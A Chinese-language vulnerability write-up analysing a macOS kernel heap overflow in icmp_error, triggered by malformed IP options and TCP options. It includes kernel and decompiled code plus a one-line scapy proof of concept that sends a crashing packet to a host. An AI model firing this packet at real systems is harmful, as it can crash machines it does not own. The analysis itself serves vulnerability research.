# 一个mac的数据包处理不当的漏洞

## 程序调用

首先程序调用

ip_input_process_list
的
ip_input
来处理ip数据包



#### **IP数据包结构**：



1-1.版本4位，表示版本号，目前最广泛的是4=B1000，即常说的IPv4；相信IPv6以后会广泛应用，它能给世界上每个纽扣都分配一个IP地址。

1-2.头长4位，数据包头部长度。它表示数据包头部包括多少个32位长整型，也就是多少个4字节的数据。无选项则为5（红色部分）。

1-3.服务类型，包括8个二进制位，每个位的意义如下：

​       过程字段：3位，设置了数据包的重要性，取值越大数据越重要，取值范围为：0（正常）~ 7（网络控制）

​       延迟字段：1位，取值：0（正常）、1（期特低的延迟）

​       流量字段：1位，取值：0（正常）、1（期特高的流量）

​       可靠性字段：1位，取值：0（正常）、1（期特高的可靠性）

​       成本字段：1位，取值：0（正常）、1（期特最小成本）

​       保留字段：1位 ，未使用

1-4.包裹总长16位，当前数据包的总长度，单位是字节。当然最大只能是65535，及64KB。

2-1.重组标识16位，发送主机赋予的标识，以便接收方进行分片重组。

2-2.标志3位，他们各自的意义如下：

​       保留段位(2)：1位，未使用

​       不分段位(1)：1位，取值：0（允许数据报分段）、1（数据报不能分段）

​       更多段位(0)：1位，取值：0（数据包后面没有包，该包为最后的包）、1（数据包后面有更多的包）

2-3.段偏移量13位，与更多段位组合，帮助接收方组合分段的报文，以字节为单位。

3-1.生存时间8位，经常ping命令看到的TTL（Time To Live）就是这个，每经过一个路由器，该值就减一，到零丢弃。

3-2.协议代码8位，表明使用该包裹的上层协议，如TCP=6，ICMP=1，UDP=17等。

3-3.头检验和16位，是IPv4数据包头部的校验和。

4-1.源始地址，32位4字节，我们常看到的IP是将每个字节用点（.）分开，如此而已。

5-1.目的地址，32位，同上。

6-1.可选选项，主要是给一些特殊的情况使用，往往安全路由会当作攻击而过滤掉，普联（TP_LINK）的TL-ER5110路由就能这么做。

7-1.用户数据。



ip前面没有问题，问题在可选字段处理

ip_dooptions函数

如果数据出错就调用icmp_error函数

通过设置错误的长度来触发漏洞
## 漏洞分析

在icmo_error里面拷贝了数据包n
向一个固定大小的堆。

```
m_copydata(n, 0, icmplen, (caddr_t)&icp->icmp_ip);

```


确认icmplen的长度

```
nlen = m_length(n);



icmpelen = max(tcphlen, min(icmp_datalen,
(oip->ip_len - oiphlen)));
}



通过这一段
th = (struct tcphdr *)(void *)((caddr_t)oip + oiphlen);

if (th != ((struct tcphdr *)P2ROUNDDOWN(th,
sizeof(u_int32_t))))
goto freeit;
tcphlen = th->th_off << 2;
tcphlen长度60
另一个为包裹总长度。




icmplen = min(oiphlen + icmpelen, nlen);
    oiphlen长度为ip结构长度28

```
计算后，这个玩意是不带l链路层的包裹长度88
```
m_getcl(int wait, int type, int flags)
{
struct mbuf *m;
int mcflags = MSLEEPF(wait);
int hdr = (flags & M_PKTHDR);

/* Is this due to a non-blocking retry?  If so, then try harder */
if (mcflags & MCR_NOSLEEP)
mcflags |= MCR_TRYHARD;

m = mcache_alloc(m_cache(MC_MBUF_CL), mcflags);
if (m != NULL) {
u_int16_t flag;
struct ext_ref *rfa;
void *cl;

VERIFY(m->m_type == MT_FREE && m->m_flags == M_EXT);
cl = m->m_ext.ext_buf;
rfa = m_get_rfa(m);

ASSERT(cl != NULL && rfa != NULL);
VERIFY(MBUF_IS_COMPOSITE(m) && m_get_ext_free(m) == NULL);

flag = MEXT_FLAGS(m);

MBUF_INIT(m, hdr, type);
MBUF_CL_INIT(m, cl, rfa, 1, flag);

mtype_stat_inc(type);
mtype_stat_dec(MT_FREE);
#if CONFIG_MACF_NET
if (hdr && mac_init_mbuf(m, wait) != 0) {
m_freem(m);
return (NULL);
}
#endif /* MAC_NET */
}
return (m);
}


#define    MBUF_INIT(m, pkthdr, type) {                    \
_MCHECK(m);                            \
(m)->m_next = (m)->m_nextpkt = NULL;                \
(m)->m_len = 0;                            \
(m)->m_type = type;                        \
if ((pkthdr) == 0) {                        \
(m)->m_data = (m)->m_dat;                \
(m)->m_flags = 0;                    \
} else {                            \
(m)->m_data = (m)->m_pktdat;                \
(m)->m_flags = M_PKTHDR;                \
MBUF_INIT_PKTHDR(m);                    \
}                                \
}

```
可以看到，实际上的data就是pktdat，长度87
写入87-8的地方



### poc

import scapy
from scapy.all import *
send(IP(dst="192.168.31.129",options=[IPOption("A"*8)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))

### mac

    mac10.12系统上无法利用成功目前，
}
v21 = (unsigned __int64)&v7[v18];
result = v21 & 0xFFFFFFFFFFFFFFFCLL;
if ( v21 != (v21 & 0xFFFFFFFFFFFFFFFCLL) )
goto LABEL_64;
result = 4 * (unsigned int)(unsigned __int8)(*(_BYTE *)(v21 + 12) >> 4);
if ( (unsigned int)result < 0x14 )
goto LABEL_64;
v14 = *((unsigned __int16 *)v7 + 1);
v22 = (unsigned __int16)(4 * (unsigned __int8)(*(_BYTE *)(v21 + 12) >> 4));
v23 = (unsigned __int16)result + v10;
if ( v14 < v23 )
goto LABEL_64;

    这里验证了v21（也就是tcp的地址是不是四字对其）
    ip包本身是对其的，mac包不是，加在一起地址怎么可能对其，poc也跑不通

## 桥接会数据转发，所以主机有洞也会崩溃，切记
## 虚拟机中tcp包无法四字接对齐，所以无法使用
